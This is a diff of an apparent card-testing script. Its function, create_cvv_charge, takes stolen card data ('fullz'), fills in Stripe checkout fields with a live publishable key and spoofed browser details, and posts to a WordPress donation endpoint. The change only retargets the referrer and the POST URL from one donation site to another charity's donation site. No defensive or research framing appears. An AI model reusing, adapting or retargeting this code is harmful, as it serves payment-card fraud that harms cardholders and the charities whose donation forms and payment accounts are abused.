@@ -44,7 +44,7 @@ async def create_cvv_charge(fullz , session):
         'sid':'2952eb70-08a1-46eb-acf6-cbb91b9f98b949ab7d',
         'pasted_fields':'number',
         'payment_user_agent':'stripe.js/0c81e1259e; stripe-js-v3/0c81e1259e; card-element',
-        'referrer':'https://lumivoce.org',
+        'referrer':'https://donate.givedirectly.org',
         'time_on_page':'27287',
         'key':'pk_live_519sODGHwVm9HtpVbGWn3R5HrSXBaErzDUXPjtr2JvODEXgSV8x7UQnU3fChIZ6hlwrgM4ubVpp1DFbUDX74ft4pV00GlpMnrpR',
         }
@@ -69,7 +69,7 @@ async def create_cvv_charge(fullz , session):
         }
 
         response = await session.post(
-            'https://lumivoce.org/wp-admin/admin-ajax.php',
+            'https://donate.givedirectly.org/wp-admin/admin-ajax.php',
             params=params,
             files=files,
         )
